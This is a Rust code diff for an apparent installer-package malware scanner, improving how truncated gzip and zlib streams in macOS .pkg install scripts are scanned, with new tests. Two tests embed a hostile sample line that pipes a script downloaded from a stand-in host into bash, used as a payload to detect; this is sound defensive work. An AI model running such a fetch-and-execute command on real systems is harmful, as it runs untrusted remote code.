@@ -139,28 +139,41 @@ fn scan_scripts_entry(
     findings: &mut ScriptFindings,
 ) -> Result<(), RuleOutcome> {
     // An entry we can't reach (bounded read stopped short) is
-    // unreadable, not absent. A partial bzip2 read is scanned, then reported
+    // unreadable, not absent. A partial read is scanned, then reported
     // unreadable below.
-    let (raw, gap) = xar::read_entry_partial(content, archive, entry, limits)
+    let (raw, mut gap) = xar::read_entry_partial(content, archive, entry, limits)
         .map_err(|_| RuleOutcome::NotApplicable)?;
 
+    let label = format!("{}!{}", ctx.path.display(), entry.path);
     // Scripts is normally gzip-wrapped cpio; if not gzip, `read_entry`
-    // already undid the heap encoding.
-    let archive_bytes = match crate::inflate::gzip_decompress(&raw, limits.max_entry_bytes) {
-        Ok(v) => v,
-        Err(_) => raw,
+    // already undid the heap encoding. A damaged inner gzip is scanned as far
+    // as it decoded, and the raw bytes are scanned too unless the stream was
+    // merely over budget (valid DEFLATE has nothing to find).
+    let archive_bytes = match crate::inflate::gzip_decompress_partial(&raw, limits.max_entry_bytes)
+    {
+        (v, Ok(())) => v,
+        (v, Err(e)) if !v.is_empty() => {
+            if e != crate::decode::DecodeError::BudgetExceeded {
+                findings.scan(label.clone(), raw, "install scripts (unparsed)");
+            }
+            gap.get_or_insert(xar::XarEntryError::Undecodable(e));
+            v
+        }
+        (_, Err(_)) => raw,
     };
 
     let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
         // Something is in there, but not in a shape we can read: scan it raw.
-        let label = format!("{}!{}", ctx.path.display(), entry.path);
         findings.scan(label, archive_bytes, "install scripts (unparsed)");
         return Err(RuleOutcome::NotApplicable);
     };
-    // Members that did parse are scanned even when the archive is cut short.
+    // Members that did parse, plus one cut off mid-body, are scanned even
+    // when the archive is incomplete.
     let complete = members.is_complete() && gap.is_none();
 
-    for member in &members.entries {
+    let parsed = members.entries.iter().map(|m| (m, ""));
+    let cut = members.cut_short.iter().map(|m| (m, " (cut short)"));
+    for (member, note) in parsed.chain(cut) {
         if !member.is_regular_file() || member.data.is_empty() {
             continue;
         }
@@ -168,7 +181,7 @@ fn scan_scripts_entry(
         findings.scan(
             label,
             member.data.to_vec(),
-            &format!("install script {}", member.name),
+            &format!("install script {}{note}", member.name),
         );
     }
     if complete {
@@ -1025,15 +1038,20 @@ mod tests {
         }
     }
 
-    /// A xar whose only entry is a `Distribution` holding `blob`, labelled bzip2.
-    fn bzip2_distribution_pkg(blob: &[u8]) -> Vec<u8> {
+    /// A xar whose only entry is a `Distribution` holding `blob`, with the
+    /// given heap `encoding style`.
+    fn distribution_pkg(style: &str, blob: &[u8]) -> Vec<u8> {
         let toc = format!(
-            r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/x-bzip2"/></data></file>"#,
+            r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="{style}"/></data></file>"#,
             n = blob.len()
         );
         let mut bytes = xar::toc_xar_bytes(&toc);
         bytes.extend_from_slice(blob);
         bytes
+    }
+
+    fn bzip2_distribution_pkg(blob: &[u8]) -> Vec<u8> {
+        distribution_pkg("application/x-bzip2", blob)
     }
 
     /// Real bzip2 (`testdata/bzip2/distribution_dropper.in`) of a dropper Distribution.
@@ -1094,6 +1112,65 @@ mod tests {
         // Intact, it is clean.
         let c = ctx("ok.pkg", &bzip2_distribution_pkg(full));
         assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
+    }
+
+    fn zlib_distribution_pkg(blob: &[u8]) -> Vec<u8> {
+        distribution_pkg("application/x-gzip", blob)
+    }
+
+    /// A zlib `Distribution` missing its Adler-32 still extracts in libxar:
+    /// the decoded text is scanned and the gap reported (#75).
+    #[test]
+    fn a_trailerless_zlib_dropper_distribution_scores_and_marks_incomplete() {
+        let full = include_bytes!("../../testdata/inflate/zlib_distribution_dropper.in");
+        assert_scored_but_partial(&zlib_distribution_pkg(&full[..full.len() - 4]));
+        assert_scored_but_partial(&zlib_distribution_pkg(&full[..full.len() - 2]));
+    }
+
+    /// Cut mid-stream, with the dropper still inside the decoded prefix.
+    #[test]
+    fn a_zlib_distribution_cut_mid_stream_scores_the_decoded_prefix() {
+        let full = include_bytes!("../../testdata/inflate/zlib_distribution_padded.in");
+        assert_scored_but_partial(&zlib_distribution_pkg(&full[..full.len() / 2]));
+    }
+
+    #[test]
+    fn a_trailerless_zlib_benign_distribution_is_not_applicable() {
+        let full = include_bytes!("../../testdata/inflate/zlib_distribution_ordinary.in");
+        let c = ctx("cut.pkg", &zlib_distribution_pkg(&full[..full.len() - 4]));
+        assert!(matches!(
+            InstallerScriptRule.evaluate(&c),
+            Err(RuleOutcome::NotApplicable)
+        ));
+        // Intact, it is clean.
+        let c = ctx("ok.pkg", &zlib_distribution_pkg(full));
+        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
+    }
+
+    /// A stored gzip-wrapped cpio `Scripts` missing its gzip trailer: the
+    /// decoded members are scanned and the gap reported (#75).
+    #[test]
+    fn a_trailerless_gzip_scripts_entry_scores_and_marks_incomplete() {
+        let full = include_bytes!("../../testdata/gzip/scripts_dropper.in");
+        let c = ctx("s.pkg", &pkg_with_scripts(&full[..full.len() - 8]));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded preinstall scores");
+        assert!(
+            signal.description.contains("install script preinstall"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+
+        // Intact, the same entry reads complete.
+        let c = ctx("s.pkg", &pkg_with_scripts(full));
+        assert!(InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .is_some());
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
     }
 
     /// A wrong block CRC does not hide the decoded bytes: libxar yields them
@@ -1316,6 +1393,144 @@ mod tests {
         let mut bytes = xar::toc_xar_bytes(&toc);
         bytes.extend_from_slice(blob);
         bytes
+    }
+
+    /// A complete (stored-block) zlib stream holding `inner`.
+    fn zlib_stored(inner: &[u8]) -> Vec<u8> {
+        let n = u16::try_from(inner.len()).expect("small blob");
+        let mut v = vec![0x78, 0x01, 0x01];
+        v.extend_from_slice(&n.to_le_bytes());
+        v.extend_from_slice(&(!n).to_le_bytes());
+        v.extend_from_slice(inner);
+        v.extend_from_slice(&crate::inflate::adler32(inner).to_be_bytes());
+        v
+    }
+
+    /// `Scripts` that is zlib on the heap and gzip-wrapped cpio inside: a
+    /// cut-short inner gzip is scanned and reported incomplete (#75).
+    #[test]
+    fn a_damaged_inner_gzip_scripts_stream_scores_and_marks_incomplete() {
+        let full = include_bytes!("../../testdata/gzip/scripts_dropper.in");
+        let c = ctx(
+            "s.pkg",
+            &pkg_with_scripts(&zlib_stored(&full[..full.len() - 8])),
+        );
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded preinstall scores");
+        assert!(
+            signal.description.contains("install script preinstall"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+
+        // Intact inner gzip reads complete.
+        let c = ctx("s.pkg", &pkg_with_scripts(&zlib_stored(full)));
+        assert!(InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .is_some());
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A stored `Scripts` gzip cut inside the DEFLATE body: the last
+    /// member's body is short, its decoded part is still scanned (#75).
+    #[test]
+    fn a_scripts_gzip_cut_mid_stream_scans_the_cut_short_member() {
+        let full = include_bytes!("../../testdata/gzip/scripts_dropper_long.in");
+        let plain = include_bytes!("../../testdata/gzip/scripts_dropper_long.out");
+        let cut = &full[..full.len() - 8 - 100];
+
+        let (prefix, err) = crate::inflate::gzip_decompress_partial(cut, 1 << 20);
+        assert!(err.is_err());
+        assert!(prefix.len() < plain.len());
+        assert!(prefix.windows(4).any(|w| w == b"curl"));
+
+        let c = ctx("s.pkg", &pkg_with_scripts(cut));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded prefix scores");
+        assert!(
+            signal
+                .description
+                .contains("install script preinstall (cut short)"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// One odc cpio member (regular file, mode 0644).
+    fn odc_member(name: &str, body: &[u8]) -> Vec<u8> {
+        let mut v = format!(
+            "070707{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:011o}{:06o}{:011o}",
+            0,
+            0,
+            0o100644,
+            0,
+            0,
+            1,
+            0,
+            0,
+            name.len() + 1,
+            body.len()
+        )
+        .into_bytes();
+        v.extend_from_slice(name.as_bytes());
+        v.push(0);
+        v.extend_from_slice(body);
+        v
+    }
+
+    /// A walk halted by the entry limit scans only the members it parsed.
+    #[test]
+    fn members_past_the_entry_limit_are_not_scanned() {
+        let mut cpio = Vec::new();
+        for i in 0..cpio::CpioLimits::default().max_entries {
+            cpio.extend(odc_member(&format!("f{i}"), b"echo hi\n"));
+        }
+        cpio.extend(odc_member(
+            "late",
+            b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
+        ));
+
+        let c = ctx("s.pkg", &pkg_with_scripts(&cpio));
+        assert!(matches!(
+            InstallerScriptRule.evaluate(&c),
+            Err(RuleOutcome::NotApplicable)
+        ));
+    }
+
+    /// A gzip header, one decoded byte, then an invalid DEFLATE symbol,
+    /// followed by plaintext: the raw bytes are scanned as well (#75).
+    #[test]
+    fn a_failing_inner_gzip_still_scans_the_raw_bytes() {
+        let mut blob = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
+        // Fixed-Huffman block: literal 'a', then the invalid symbol 286.
+        blob.extend_from_slice(&[0x4b, 0x1c, 0x03]);
+        blob.extend_from_slice(
+            b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
+        );
+
+        let (v, r) = crate::inflate::gzip_decompress_partial(&blob, 1 << 20);
+        assert_eq!(v, b"a");
+        assert!(matches!(r, Err(crate::decode::DecodeError::Malformed)));
+
+        // Zlib on the heap, so the gzip is read by the rule, not the xar layer.
+        let c = ctx("s.pkg", &pkg_with_scripts(&zlib_stored(&blob)));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the raw bytes score");
+        assert!(
+            signal.description.contains("install scripts (unparsed)"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
     }
 
     #[test]
